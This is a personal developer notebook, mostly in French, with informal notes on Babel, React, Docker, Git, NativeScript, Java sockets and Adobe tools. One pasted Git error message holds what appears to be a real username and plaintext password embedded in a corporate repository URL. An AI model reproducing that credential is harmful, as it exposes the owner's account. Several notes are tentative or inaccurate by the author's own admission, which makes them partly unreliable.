                          test: /\.js$/,
                          exclude: /node_modules/,
                          use: {
                            loader: 'babel-loader',
                            options: {
                              presets: ['env']
                            }
                          }
                        }
                      ]
                    }
              //FINPOURSUPPORTER BABEL
            };
babel : LINKBBLE 
    installer :
                npm install babel-core babel-preset-env babel-loader --save-dev
                  babel-core=core
                  babel-preset-env=environ comme core
                  babel-loader= pour fonctionner avec webpack 
reactjs : react.js :
  installer npx avec npm.
  npx create-react-app my-app (crée un projet react)
  cd my-app
              composant react
                  class MonComposant extends React.Component { ou bof:tout simplement function MonComposant(props){
                    constructor(props){
                      super(props);
                      this.state={a:x,b:y} // le constructeur est le seul endroit ou ne peux setter le state directement sans passer par this.setState
                    }
                     componentDidMount() {    // s'execute quand ce composant est ajouté au DOM
                     }
                      componentWillUnmount() { // s'execute quand ce composant est retiré duDOM
                          }
                        this.prop=xxx;
                    unefonctionamoi(){
                     this.setState({....}); // toujours passer par this.setState pour changer le state
                    }
                      render() {
                        return <h1>Hello, {this.props.name}</h1><h2>{this.state.a}</h2>;
                      }
              }
     ailleurs:         
      element=(... LINKrealskjdf
      ...html...{variable}..<MonComposant/>...
      ...)
      ou 
      element=React.createElement( LINKrealskjdf
      h1,//type
      {attribut1:'xx',attribut2:'yy'}, // attributs
      'duhtml' // enfants
      )
      ReactDOM.render( // des lors element ne bouge plus. Si besoin le changer il faut refaire le render. React s'occupe de ne modifier dans le dom que ce qui a bougé dans l'element 
        element, // LINKrealskjdf
        document.getElementById('root')
      );

docker : créer une image (executable)-> builder ->image devient container qd est runné(!=VM. Une VM virtual machine contient un OS. Un container est executé dans un OS: plusieurs containers peuvent s'executer dans un meme OS) quand est executee alors des config s'appliquent à lui-> déposer dans machine
  continuer à lire https://docs.docker.com/get-started/part2/#share-your-image
  installer docker: sudo apt-get update puis 
    avoir docker CE(community edition) ou EE(entreprise edition) recuperable sur store.docker.com
  docker --version ou docker run hello-world // verifier que docker est bien installe
  docker info // indique entre autre nombre combien j'ai de containers ? Un container (une image) ne doit contenir qu'une seule chose. (1 pyton ou 1 redis ou 1 mysql) pas plus!
    haut 
    -Stack // defini les interractions entre les services docker
    -Services // defini comment le container se comporte
    -Container // mon executable
    bas
  docker image ls // LINKdckrimgls liste les images que j'ai cree. Ajouter --all si je veux voir aussi les images qui run
  docker container ls // liste les containers qui tournent qui sont en cours d'execution 
  Dockerfile= fichier docker: Défini ce qui est dans mon environnement et qui va rentrer dans mon container. Ordre des commandes pour builder mon image(mettre des trucs dedans):execution du haut vers le bas. haut:ce qui bouge le moins. Bas ce qui change le plus car docker utilise un cache.
        FROM node:x.x.x-alpine OU python:2.7-slim OU...// sur quoi le docker est installé ? quel OS OU BIEN une image docker si je veux l'etendre (voir LINKxlxlx puissant disent-ils) 
        WORKDIR /un/path/DANSMONContainerDocker/PASdans/monOS/ 
        RUN apk update && apk add unpacket  // commandes linux executees. si LINKxlxlx ca modifie l'image docker comme une extension
        RUN npm install --quiet // par exemple.
        RUN pip3 install numpy // par exemple. Commande pip3 qui installe numpy dans mon container.
        RUN pip install --trusted-host pypi.python.org - r requirement.txt // requirement.txt doit avoir été copie precedemment dans mon container dans le WORKDIR
        COPY /un/path/dans/mon/Os /destination/dans/mon/image/docker
        COPY . . // par exemple: je copy tout dans mon image docker
        ADD . OU /un/PathDeMonOS/que/je/veuxCopierDansContainer /un/path/DANSMONContainerDocker/PASdans/monOS/    // comme COPY mais premier argument peut etre une URL
        EXPOSE 80 // ouvre le port 80 du container.
        ENV NAMEDEMAVARIABLE totoValeurDeMaVariable // créer une variable d'environnement (?) // tous les params de config doivent etre mis dans ce fichier docker. pas ailleurs(bonne pratique). (mysql.conf.d, javaMemory, phpini...) du coup ailleurs dans le fichier je peux mettre $totoValeurDeMaVariable
        ENV http_proxy hostAremplir:portAremplir // mettre ça si je suis derriere un proxy sinon il ne peut pas builder mon conteiner
        ENV https_proxy hostAremplir:portAremplir // mettre ça si je suis derriere un proxy sinon il ne peut pas builder mon conteiner 
        CMD ["npm","start"] OU ["python", "app.py"]// execute npm start OU python app.py (app.py doit avoir été copie precedemment dans mon container dans le WORKDIR) qui va s'executer quand je vais executer mon container
  fichier docker-compose.yml: (overrite le fichier docker ci-dessus)
         version:'3'
         services:
          web: // premier service = 1 container
            build: . (tu te buildera à la racine du container docker (?)
            command: npm run // overrite CMD ci dessus: en general la commande ici sert à demarrer un serveur
          postgres: // deuxieme service = 1 container                                                                                                                                                                                                                                                                                                                                                                       _ce nom peut etre lu grace à "docker image ls" voir LINKdckrimgls
  docker build -t(pour tag) unnomquejedonneamoncontainer /pathOuEstDockerfile(. par ex si j'y suis)// Creer mon container docker qui rentre dans la liste. executer ça où ya le fichier Dockerfile                                                                                                                                                                                                                         |
  docker run -it(pour interactif voir LINKjgjgjg) --rm (pour supprimer le container une fois que son execution est terminee:du coup il ne reste que l'image qui run je crois) --name=facultatifUnAutreNomJeCroisQueJeDonneAMonContainer -d (pour executer en background) -p 80:8080 -p 443:8443 nomDeMonConteneurAExecuter:tag(tag en fait il faut mettre un chiffre qui est la version. Facultatif?) LaCommandeAExecuterDansMonContainer(si elle contient un path ca ne peut etre que un path Dans mon container du coup voir l'option -v)// demarrer un contenur à partir de son image. En Foreground si je fais ctrl+c (unix seulement) ça kill le process
                                  -p portdeOS:portOuvertduContainer(je peux en mettre plusieurs)                                                                                                                                  |_peut etre un truc que Docker recupere automatiquement dans le repository docker sur le net (comme une dependance maven)                      
  docker run -it --name=facultatifUnAutreNomJeCroisQueJeDonneAMonContainer -d (pour executer en background) -p 80:8080 -p 443:8443 nomDeMonConteneurAExecuter // demarrer un contenur à partir de son image. En Foreground si je fais ctrl+c (unix seulement) ça kill le process
                                  -p portdeOS:portOuvertduContainer(je peux en mettre plusieurs)
  docker run -it -v $(pwd):/ext-mount --rm unicon/shibboleth-idp init-idp.sh (-v...c'est l'option volume. Car Le container n'a pas accès au repertoire du host. donc $(pwd) est le repertoire courant où est le container. Monte moi ce repertoire dans le repertoire /ext-mount dans mon container)
  docker container stop IDDuContainer // pour stopper l'execution d'un container (par son ID ça marche mieux voir donc la liste.)
  
  docker exec -it idp_jetty bash // LINKjgjgjg: la commande bash est executée dans le container qui demarre en mode -it(interactif) donc du coup je vais avoir le prompt bash DANS mon container. De la si j'execute top je ne vois que les process qui tournent DANS le container            
  registry
      repository1
                 imagedocker:tag1 
                 imagedocker:tag2...
      repository1
                 imagedocker:tag1
                 imagedocker:tag2...
                 
                 
visualstudiocode editeur:
  acceder au fichier trouver : ctrl+p
gource : annimation de git
    C:/gource-0.47.win64/gource -a 500 --seconds-per-day 0.5 C:/Users/lduverge/Desktop/ALTRAN/RENAULT/DiversitySimulatorDEV/diversitysimulator // -a pour nombre de secondes a sauter --file-extensions pour ne pas afficher le nom des fichiers mais que leurs extensions

github : guitub :  git : gitub : (installable sur mobaxterm :depoxer le plugin dans meme repertorie que mobaxterm.exe)
        (ne pas utiliser le plugin intellij) LINKtortoiseGItsdflk 
          attention tortoiseGit ne pas faire diff with Previous version ça compare la version actuelle avec 2 commits plus loin
          git --help unecommande
  installé sous D:\Dev\Git\bin
   http://bioinfo-fr.net/git-premiers-pas et /http://bioinfo-fr.net/git-usage-collaboratif
   https://onlywei.github.io/explain-git-with-d3/ et https://learngitbranching.js.org/
    repertoireLocal | index(~=pannier=stagging) | HEAD(~=commande) | serveurDistant
                  add                        commit              push
    .gitignore est un fichier à la racine du projet dans lequel j'ecris toutes les extensions de fichiers que je ne veux pas gerer dans git (*.iml)
    POUR QUIL SOIT PRIS EN COMPTE IL FAUT LE COMMITER ET LE PUSHER (ET RECREER LE FICHIER QUI FAIT CH... ?)
              exemple de gitignore
                    # ---- Maven
                    target/
                    .class
                    # ---- IntelliJ IDEA
                    *.iws
                    *.iml
                    *.ipr
                    .idea/
                    
                    # ---- Package Files
                    .jar
                    .war
                    .ear
                    
                    # ---- Eclipse
                    .classpath
                    .project
                    .settings
                    
                    # ---- Mac OS X
                    .DS_Store?
                    Icon?
                    # Thumbnails
                    ._*
                    # Files that might appear on external disk
                    .Spotlight-V100
                    .Trashes
                    
                    # ---- Windows
                    # Windows image file caches
                    Thumbs.db
                    # Folder config file
                    Desktop.ini
                    
                    # ---- Nondex
                    .nondex
                    
                    # ---- Nondex
                    .gitkeep

    .git doit etre au meme niveau que pom.xml(pour innersource)
    .gitlab-ci.yml contient une suite de jobs qui s'executent sequenciellement(possible executer .sh)
    git --version // voir la version installee de git.
    pour installer la derniere version faire : git update-git-for-windows
    Première chose: parametrer mon git:
          --local > --global > --system
          git config --global user.name mon_nom
          git config --global user.email mon_mail
          git config --list // voir lire mes variables de configuration : d'abord ecrit les sytems puis global puis local qui override les autres
          git config --local credential.helper store //store pour lui dire de stocker en clair dans un fichier mon user/password  MAIS AU FINAL MARCHE PAS: voir ci dessous
          git config --globaloubien--local credential.helper store --file .gitidentifiants //MARCHE PAS store pour lui dire de stocker en clair dans un fichier mon user/password
          git config --system --unset credential.helper puis/ou git config --global --unset credential.helper puis/ou git credential-manager clear (l'aide s'affiche si on fait git credential-manager) // pour virer le cache du credential si il ne me  prompte plus pour saisir l'authentif user password
          pour pusher en ssh connecter avec une cle : 
                 ssh-keygen -t rsa -b 4096 -C "kanailaurent@gmail.com" // generer une paire de clé dans gitbash
                 clip < /c/Users/lduverge/.ssh/id_rsa.pub // copier dans le ... ma cle publique.. et ensuite le copier dans github
                 ssh-add /c/Users/lduverge/.ssh/id_rsa // ajouter (je peux renommer id_rsa comme je veux: toto_rsa par ex) 
                 eval $(ssh-agent -s) // demarrer le ssh-agent (il se peut qu'il ne soit pas demarré c pour ca.) pour une authentification automatique
                 ssh-add /c/Users/lduverge/.ssh/id_rsa // ajouter ma paire de clé au ssh agent (je peux renommer id_rsa comme je veux: toto_rsa par ex)
          pour definir un proxy : 
                git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port
                pour dégager le proxy : 
                git config --global --unset http.proxy           
  si erreur Filename too long 
      git config --system core.longpaths true
  si erreur
      fatal: unable to access 'https://lduverge:Cadreras123@scm.soprahr.com/scm/frgec/com.crca.com.soprahr.hub.bc.usermgt.interfaces.git/': error setting certificate verify locations:
      CAfile: /etc/pki/tls/certs/ca-bundle.crt
      CApath: none
          git config --add http.sslcainfo /cygdrive/d/Dev/Git/mingw64/ssl/certs/ca-bundle.crt
 creer des alias :  
    git config --global alias.st 'status' //global pour tous les projets sinon l'enlever. ici git status est copié en alias git st.
    git config --global alias.add 'add -v' // a tester.          
    git clone:
      dupliquer/copier/recuperer un repository present sur le web en local. (en general c'est un fork que je clone si je me greffe à un projet existant)
        git clone https://username(facultatif):motdepasse(facultatifLesguillemetsdoiventEtreEchappeesPar\)@githubSuiteUrl.com/spring-projects/spring-security-oauth-javaconfig.git // le copie dans le repertoireLocal ou je suis tout le projet son histoire ses vieilles branches commitees.
        git clone https://scm.soprahr.com/scm/su/sample-edsn-usermanager.git nomdefacultatifmonprojetRepertoireQueJeLuiDemandeDeCreer
      dupliquer/copier/recuperer un repertoire-repository local vers mon nouvel espace de travail
        git clone D:/path/repertoireacloner (besoin peut etre faire commit dans ce repository(repertoireacloner) pour l'initialiser) 
    git init:
      creer un nouveau projet from scrach dans repertoireLocal (cree aussi un repository) 
        git init // a faire dans le repertoire ou y a mes sources: c'est un repo pour bosser dessus et modifier dessus direct. N'est pas fait pour pusher dedans.. Ensuite si je veux pusher ça sur mon repository github voir LINKenvoiyer
        git init --bare // cree un repository qui ne sert qu'à partager : le code source dedans n'est pas visible. on ne peut que cloner pusher et puller à ce repo. 
    branches: master; develop; etc etc... elles existent en local et sur le repo distant et sont toutes TOUTES indépendantes les unes des autres c a d : je peux avoir en local un master qui push dans le develop distant. Les branches c de la merde. DEVOPS.
        si j'ai (HEAD detached from 351dcab) c'est parce que mon HEAD est orphelin et dans aucune branche(parce que j'ai fait un git checkout sur un commit). faire git stash save "bla"; git checkout master; git merge codeDeMonHeadDetached. Ancienne methode: pour le recuperer dabord le rattacher a une branche temporaire: git branch temp puis git checkout temp. Ensuite il faut ecraser une branche par temp (voir ci dessous)
      git branch // pour voir toutes les branches.(attention ne montre pas toutes les branches en fait. pour les voir toutes je ne sais pas comment faire) et voir quelle branche est activee A8. Ou est mon HEAD. Les branches c la merde. DEVOPS
      git branch nomdelabrancheacreer // pour creer une nouvelle branche: ca ne cre pas une branche vide: ca copie la branche actuelle dans la nouvelle branche. Les branches c la merde. DEVOPS
                                          maintenant je peux checkouter sur cette nouvelle branche ET avant tout faire un commit dessus sinon LINK98530 puis je peux la pusher sur le repo distant: si le nom de la branche local est le meme que sur une branche du repository distant alors il va pusher dans cette branche qui a ce meme nom. Pas mal pour pusher sur une autre branche facilement.
      git branch -d nombrancheasupprimerDeleter // supprimer une branche
      git branch -f nomdelabrancheAEcraser nomdelabrancheQuivaPrendreLaPlaceDeLautreEtVaLecraser
      
    switcher d'une branche à l'autre: ca remplace mes fichiers par ceux de la branche que je choisis. 
      se mettre dans le repertoire du projet au meme niveau que le .git (je pense)
      git checkout nombranche_vers_laquelle_aller. Le HEAD devient cette nombranche_vers_laquelle_aller LINK98530: attention juste apres la creation de branch faire un premier commit sinon lors du checkout on ne voir rien bouger dans l'éditeur
      git checkout numerodanciencommitdeMaBranche // pour aller en arriere dans le temps. ensuite pour revenir faire git checkout MaBranche
      git checkout -b nomBranche_vers_laquelle_aller_et_si_elle_n'existePasIlLaCreeDansLaFoulee
      git checkout master // reviens dans le master et le HEAD maintenant est dans le master
      git checkout nomfichier // pour recuperer un fichier utile aussi si il dit "Your local changes to the following files would be overwritten by merge" sur des fichiers et que je m'en fous de mes modifs et que je veux les ecraser
    merger ma branche avec mon master ATTENTION TOUJOURS COMMITER AVANT DE FAIRE UN MERGE
      se positionner dans là ou je veux tirer vers moi (le master en principe)
      git merge NomDeLaBranchequejeveuxTirerVersLaBranchDansLaquelleJeSuis(en principe le master) master<----tototo ATTENTION TOUJOURS COMMITER AVANT DE FAIRE UN MERGE
                merge manuellement <<<<<<<<<<<< HEAD
                                        mon cote
                                ==================
                                        son cote
                                >>>>>>>>>>>>>>> blablabla
    preparer un commit:(on peut le faire plusieurs fois avant de commiter) 
      git add -v(verbose) * ou /xx/* ou . ou NomFichier ou '**/pom.xml' (si c'est dans un long path sous-repertoire) // repertoirelocal->index est indexe :Pour rajouter QUE LES NOUVEAUX/UPDATED FICHIERS dès lors toutes les modifs faites AVANT add seulement vont etre commitees quand je ferais git commit... si je modif d'autres fichiers Apres et je commit direct, ils ne sont pas envoyes. A utiliser si j'ai erreur "needs merge you need to resolve your current index first" car il desindexe les fichiers qui n'ont pas bien mergé
      si j'ai le message hint: You've added another git repository inside your current repository.... et que je veux conserver le sous module git faire : d'abord "git rm -f --cached phpExtLib/PHPMailer" pour revenir en arriere puis "git submodule add https://github.com/PHPMailer/PHPMailer.git phpExtLib/PHPMailer". Il faudra alors pusher .gitmodules pour les autres developpeurs. Les autres developpeurs devront faire "git submodule init" puis "git submodule update"
      git rm --cached <filePath1 filePath2> //LINKrmgit a utiliser aussi si gitignore ne semble pas marcher: ignore l'indexation et le suivi d'un fichier. ATTENTION PEUT SUPPRIMER LES FICHIERS. SI je ne veux pas faire git reset HEAD monfichier pour l'ignorer. Les vire de untracked file mais certains fichiers on y arrive pas... voir LINKcheckoutquandmeme
      git rm -r --cached <filePath> //-r pour recursif
      git status -uno//(-uno pour ne pas voir les untracked) pour savoir quels fichiers vont etre commites ( a faire si j'ai le message Changes not staged for commit)
      git commit:  apres commit je peux faire un fetch((recupere du repo distant vers le local dans une autre localisation:pour l'instant n'a pas touché a mon espace de travail) puis pull (pour récupérer les dernières modifs des collegues et le merger avec mon espace de travail) puis ensuite un push
                      si j'ai l'erreur "Please commit your changes or stash them before you merge." quand je fetch-pull faire: une sauvegarde a la mano de tout mon repertoire.
      git commit -m "blablamMonCommentaire"// index->masterOuBrancheQuiALeHEAD :jusqu'a present tout est encore en local. voir git add si il ne commit pas malgres tout.
      git commit -am // -a pour ne commiter que les fichiers je crois ou bien -a pour forcer l'ajout de fichier non indexes avant de faire le commit
      apres commit je peux faire un pull puis ensuite un push
      git diff-tree --no-commit-id --name-only -r <numero de commit> // voir la liste des fichiers commités  d'un commit 
      git reset HEAD .OuNomFichier ou *.extensionfichier // opposé inverse de add pour retirer ce fichier de l'index added(voir LINKresetgit et Linkcheckout) annuler undo un delete MAIS: si j'ai déjà pushé alors faire:LINKrmgit 
      git reset HEAD~ annule/undo le dernier commit. Ne pas le faire après que mon dernier commit ait ete pushe et merge avec l'origin car cela desynchronise mon local du distant. SI je veux quand même le faire par necessite alors faire git reverT: ça recommiT un snap d'avant le commit pourri.
                on peut aussi faire git commit --amend // pour redéfinir le dernier commit sans besoin de l'annuler
      git reset //LINKresetgit annuler le dernier add
      git reset --hard versionDuTag : ce tag revient dans le mon HEAD/branch + repertoire
      git rebase //TROP GALERE!!!! ne pas utiliser avant une formation
      git rebase commitquinebougepasEtQuiVaRecevoirLaSuiteDeLHistoire commitQuiVaMettreSonHistoireALaSuiteDuPremierArgument // a la toute fin faire rebase DernierCommit master pour que le master se remette au bout
      git rebase -i identifiantCommitDuPassé // ouvre un editeur et je peux manipuler mes commits du passer pas a pas un par un jusqu'a aujourd'hui. J'ai du utiliser ca pour supprimer les indexs de fichiers trop gros qui m'empechaient de pusher sur le repo distant. 
                si je veux commencer depuis le debut faire git rebase -i --root
                quand j'ai remplacé chaque pick souhaité par edit, faire comme dans vi: sauver et quitter. il fait alors du pas a pas sur chaque edit ou a chaque fois je fait soit git rebase --amend(modifier le commit en cours) ou git rebase --continue(au suivant!)
                        quand je fais git rebase --amend alors il ouvre un editeur montrant le commit. Executer comme dans vi :!macommandeGit (exemple faire un checkout pour supprimer de l'index) et Entree a chaque fois. Quand fini faire :wq. et puis git rebase --continue et ainsi de suite pour finir avec un git rebase --continue jusqu'à ce que la branche rebase soit automatiquement mergée avec mon master.
                pour annuler mon rebase en cours faire 
                git rebase --abort ou au pire pour sortir faire git rebase --quit
        pour supprimer tous les gros fichiers de l'historique pour que je puisse pusher sur github
        si j'ai "error: could not read '.git/rebase-merge/head-name': No such file or directory" faire git reflog 
            git filter-branch --index-filter "git rm --cached -f --ignore-unmatch(ignoreleserreurs) NomDeMonGrosFichier.webm" --prune-empty --tag-name-filter cat -- --all
      git log //voir les commits. N'affiche pas les commits du futur donc voir LINKlkghhrghh
      git log --all // voir les commits du future si j'ai fait un checkout sur un commit du passé LINKlkghhrghh
      git log --name-status // voir tous les fichiers modifiés à chaque commit
      git log --follow -- path/du/fichier // pour voir les commits d'un fichier specifique
      git log --graph --oneline --decorate --all // affiche joli voir joli
      git shortlog -s -n  // voir le nombre de commits par auteur : stats.statistiques
      git diff compare mon workspacepasencoreadded avec le dernier commit
      git diff --name-only // affiche que les noms des fichiers differents
      git diff HEAD~1 path/dun/fichier.xxx // compare un seul fichier avec le commit precedent
      git diff <optionel num commit> <wildcardPathOptionel> compare repertoire avec index ou unCommit
      git diff <branche1> <branche2>
      git diff --cached <optionel num commit> <wildcardPathOptionel> compare index avec HEAD ou unCommit
      git diff numcommitavant numcommitapres <wildcardPathOptionel> compare 2 commits (respecter ordre commits pour que ce soit plus comprehensible)
      git tag 1.2.0 (sans mettre "v")// tag le dernier commit fait dans mon repo. ce tag ne se push pas.... voir Linktaggit
      git tag 1.2.0 iducommit fourni par >git log // cree un tag pour le désigné
      git diff --name-only // affiche que les noms des fichiers differents
      Linktaggit:  le tag ne se push pas par defaut: pour le pusher faire git push origin <identifiant du tag>
      git checkout pathfichiermodifieMaisPasAdded //annuler mes modifs 
      git checkout <nom_du_tag> pour revenir à une ancienne version// ne marche pas si je veux remplacer mon working directory modifié par le dernier commit: dans ce cas faire git chekout -- pathAvecWildcardDesFichiersQueJaiModifieDansLeWorkSpaceMaisQueJeNaiPasAdded (undo) Linkcheckout
      git checkout -f <nom_du_tag> pour ignorer le message "The following untracked working tree files would be overwritten by checkout" ATTENTION d'avoir commité avant et d'etre sur que le warning ne parle que de fichiers dont je m'en fous. LINKcheckoutquandmeme  
      si j'ai l'erreur "Please commit your changes or stash them before you merge." quand je pull faire: une sauvegarde a la mano de tout mon repertoire.
      git stash save "<message a ecrire>"// sauve mes repertoires dans un truc temporaire et revient à la version du dernier commit.
          puis git pull puis resolve tout (il merge ).
      git stash list : liste mes sauvegardes temporaires chaque sauvegarde a un id. 
      git stash drop <idretourné> supprime de la liste un stash sans l'appliquer à ma branche 
      git stash show -p // diff compare le dernier stash avec le dernier commit en cours.(a utiliser avant de faire stash pop par exemple) 
      git stash pop applique le dernier stash de la liste en le mergeant avec ma branche en cours et supprime ce stash de la liste.
      git stash apply <idretourné> par la commande ci dessus: stash@(2) par exemple // applique à ma branche ce stash en le mergant avec ma branche mais ne le supprime pas de la liste
      git stash clear // supprime tous mes stash! attention.
    envoyer/recuperer des projets entre mon local et le github:
      fork: fait une copie de tout un projet (branches incluses) dans mon github. Je peux ensuite travailler dessus dans github ou en local(cloner) et à la fin je soumet mes modifs: pull request. si accepte: ça fetch+merge+commit tout mon fork(je crois)
      binder avec un repository distant: LINKenvoiyer
        git remote -v // etre dans mon projet. Sert à savoir à quel repo distant le projet est lie pour les pushpull renvoit le nom du bind (nom=origin)
        git remote rm origin(distant) // pour debinder mon projet avec le repository "origin" distant
        git remote add origin git@github.com:monusername/UnAutreRepository.git // (git@github.com facultatif) pour lier mon projet avec un repository. Je pourrais pusher et puller dessus (la premiere fois il faudra d'abord créer ce repository au meme nom sur github)
      transferer le code par le reseau: (par defaut en https: il demande le user/pass)        
        git push origin masterOudevelopOuBrancheLocale //HEAD(origin)->ServeurDistantOuRepertoireQQpart(master ou develop) envoi sur le serveurOuRepertoireRepoQQpart pour merger avec le master: ça fetche+merge+commit là bas.
            ne pushe pas les repertoires vides: pour ça ajouter juste un fichier avec "x" dedans
            si j'ai error: failed to push some refs to // peut etre j'ai oublié de commité ou bien il faut puller avant
        git config credential.helper store // pour ne plus qu'il demande le user/pass en https
        git pull: avant de faire ca faire git fetch
        la premiere fois faire git pull origin master
        git pull URLouPathRepositoryDistantPeutEtreLocal si il veut pas et/ou met message refusing to merge unrelated histories mettre:--allow-unrelated-histories//recupere les derniers push des autres sur mon HEAD local // si il dit "not a git repository" il faut que je me place dans le projet git
                    si il dit "....be overwritten by merge" c'est que quelqun a poste sur le repo des choses qu'il n'aurait pas du. 2 solutions: 1)faire un git clone ailleurs du projet puis git rm fichiersquinauraientpasdusetrouverdanslerepo puis commit et push 2)aller sur le repo et les supprimer
            
Nativescript :
      generateur d'icones http://nsimage.brosteins.com/
      guide commandes : https://github.com/NativeScript/nativescript-cli#the-commands
      demarrer simulateur : tns run android --avd lenomdelemulateurquejeveuxVoirsurandroidADV (bien stopper tout process adv avant) 
                                                            cd C:\Users\Laurent\NativescriptApp\FryTravel\sample-Groceries puis tns run android --avd 4_4x86 
                            tns run android --device 1 (id  du device recupere par liste des tels branches : tns device)
      demarrer sur mon phone branche sur usb : tns run android 
      puis faire tns livesync android --watch pour rafraichissement auto) 
      
                        # run android
                        ┌──────────────────────────────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
                        │ Usage                        │ Synopsis                                                                                                    │
                        │ Run on all connected devices │ $ tns run android [--key-store-path <File Path> --key-store-password <Password> --key-store-alias <Name> -  │
                        │ and running emulators        │ -key-store-alias-password <Password>] [--release] [--justlaunch]                                            │
                        │ Run on a selected connected  │ $ tns run android --device <Device ID> [--key-store-path <File Path> --key-store-password <Password> --key  │
                        │ device or running emulator   │ -store-alias <Name> --key-store-alias-password <Password>] [--release] [--justlaunch]                       │
                        │ Start an emulator and run    │ $ tns run android --emulator [<Emulator Options>] [--key-store-path <File Path> --key-store-password        │
                        │ the app inside it            │ <Password> --key-store-alias <Name> --key-store-alias-password <Password>] [--release] [--justlaunch]       │
                        └──────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
                        Runs your project on a connected Android device or in a native Android emulator, if configured. This is shorthand for prepare, build and deploy.
                        While your app is running, prints the output from the application in the console.
                        ### Options
                            * --device - Specifies a connected device on which to run the app.
                            * --emulator - If set, runs the app in a native emulator for the target platform, if configured. When set, you can also set any other valid combination of emulator options as listed by $ tns help emulate android.
                            * --release - If set, produces a release build. Otherwise, produces a debug build. When set, you must also specify the --key-store-* options.
                            * --key-store-path - Specifies the file path to the keystore file (.P12) which you want to use to code sign your APK. You can use the --key-store-* options along with --release to produce a signed release build. You need to specify all --key-store-* options.
                            * --key-store-password - Provides the password for the keystore file specified with --key-store-path. You can use the --key-store-* options along with --release to produce a signed release build. You need to specify all --key-store-* options.
                            * --key-store-alias - Provides the alias for the keystore file specified with --key-store-path. You can use the --key-store-* options along with --release to produce a signed release build. You need to specify all --key-store-* options.
                            * --key-store-alias-password - Provides the password for the alias specified with --key-store-alias-password. You can use the --key-store-* options along with --release to produce a signed release build. You need to specify all --key-store-* options.
                            * --justlaunch - If set, does not print the application output in the console.
                        ### Attributes
                        
                            * <Device ID> is the index or name of the target device as listed by $ tns device android
                            * <Emulator Options> is any valid combination of options as listed by $ tns help emulate android
                   pour mettre des images : img:                            
                 <Image src="~/images/logo.png"></Image> va chercher sous app/images.logo (on peut mettre aussi src="http..etc...")
                 <Image src="res://logo_login" stretch="none" horizontalAlignment="center"></Image> Va chercher sous App_Resources/logo_loginXXXXX.png (XXX: la bonne taille)
                                             
                        

Messagerie email :
    IMAP synchronise toujours serveur et client lourd (demande aussi plus de bande passante)
    POP non. les deux vivent independamment 

traitement en ligne des images :
  déflouter unblur
    http://www.photo-sharpen.com/
photoshop :
justifier un texte : menu calques>texte>transformer en paragraphe > ouvrir fenetre pannel texte : les options justification sont activées: je peux focaliser la justfication sur les lignes selectionnees
virer effet aimant magnet
    presser Ctrl en meme temps
  taille de l'image : image>taille de l'image
  pour imprimer plusieurs images dans une page :
    fichier>automatisation>Collection d'images
 couleurs rvb c bon pour l'écran mais pour imprimer il faut faire image> mode > cmjn
 pour imprimer sur papier: format tiff 
  flou smooth blur: Filtres>Attenuations
  vecteurs: ctrl  pour deplacer un point/selectionner un point
            ctrl  pour deplacer une manette de courbe et son opposé
            shift ou alt pour deplacer une manette de courbe sans son opposé
            rien (signe -) pour supprimer un point(marche pas sur le dernier donc le selectionner dans les outils)
            echap pour laisser le vecteur en cours et faire un nouveau vecteur
            selectionner les vecteurs utiliser dans outil la fleche blanche puis pour deplacer: ctrl drag
faire un chat :
Pour faire un serveur serveur de chat etc... fonctionnement des sockets
 ServerSocket listener = new ServerSocket(PORT);  // THIS, ecoute sur le port numero PORT. (le programme continue) ce port est désormais reservé. Plusieurs client peuvent communiquer avec THIS et pour chaque client qui se connecte un Socket different est attribué sur ce port.
  // pas  besoin de faire cette ligne ci dessous mais c pour expliquer client serveur
  Socket chaussette = listener.accept(); // ICI il FREEZE : attend qu'un client arrive. Si un client arrive il prend la chaussette pour lui. (en général on met ça dans while(true){ new UnThread(listner.accept();)}
  chausette.getOutputStream() // permet de d'écrire dans le stream en sortie de cette chausette
  chausette.getInputStream() // permet de lire ce qui arrive du stream
  finally{chausette.close();} // l'echange de cette info est termine : si il ya un .accept qui attends il est interrompu
  Cote client j'ai :
    Socket s = new Socket("hostdemonserveurParExempleLocalhost",PORT); // cela DEFREEZE le listener.accept ci dessus
    s.getInputStream(); // pour lire read ce qui arrive de la chausette
    s.getOutputStream();
 si erreur java.net.SocketException socket closed This exception means that you closed the socket, and then continued to try to use it. os.close(); And you closed it here. Closing either the input or the output stream of a Socket closes the other stream and the Socket. 
                        
   
Adobe illustrator :
    enlever la grille de perspective
        Ctrl+Shift+i
    vectorisation de l'image 
        affichage>vectorisation image
      afficher/Masquer outils 
            tab
      superbes tuto : https://www.youtube.com/watch?v=pcj3Lu0Z7B8
    avoir une vue des vecteurs sans les fonds : 
      ctrl+y
    commencer par a p (fleche blanche, plume) pour appres revenir sur fleche blanche par controle
    possible deplacer point d'ancrage alors que je suis sur une poignee (sans avoir relache) : espace super pour deplacer avant de relacher
    garder les horizontals vertical en meme temps qu'on drag
        majuscule
    pour deselectionner :
        cltr+maj+a
    transformer
        e
        pour transformer avec les chiffres et qu'il soit tres precis: ouvrir le panel transformation > menu > afficher les options > decocher "aligner sur la grille en pixels"        
    mode crayon : 
          possible redessiner au crayon: se placer sur un tracer (les crayon est alors neutre) et reprendre
          important: double cliquer sur crayon pour ses options: lissage, fidelite, deselectinner quand fini de tracer, permettre de modifier un trace dejà fait comme si ct à la volee
          ALT pour passer en mode arrondi
          mais pendant que je dessine ALT sert à fermer le trace
    concepteur de forme : 
      pour combiner deux elements dans une meme couleur (naviguer à travers les couleurs avec fleches)  
      alt pour supprimer des traces rapidement en ne touchant pas au reste de le forme
    peinture dynamique 
        pour remplir les formes d'une couleur et ensuite si je bouge les traces la peinture suit le trace (il cree des groupes)(fleches pour basculer entre les couleurs)
        alt pour basculer en pipette
        voir les options de peinture dynamique: possiblite qu'adobe nous montre les espaces consideres comme fermes ou ouverts
    Gomme Maj+e 
        couper les traces. (que sur le calque selectionne. Si aucun calque select alors tout traces sont modifs)
        pour effacer une zone
        gomme+alt+dragndrop
    pinceau 
        pour faire des traces avec "motif" habillage
        fonctionne de pair avec 
            modifier le contour d'un trace : 
            outil largeur en forme de pieuvre à placer sur un trace ayant au moins un contour.
    
    pour changer la taille du plan de travail : 
      fichier>format de document > Modifier plan de travail
    pour travailler avec precision
        utiliser fenetre > transformation et modifier les valeurs dedans
    pour afficher/masquer la regle: 
      Ctrl+r
      
    pour enregistrer avec des bordures de coupe
        enregistrer sous pdf>Reperes et fonds perdus >trait de coupe
      crayon main levee ctrl+n
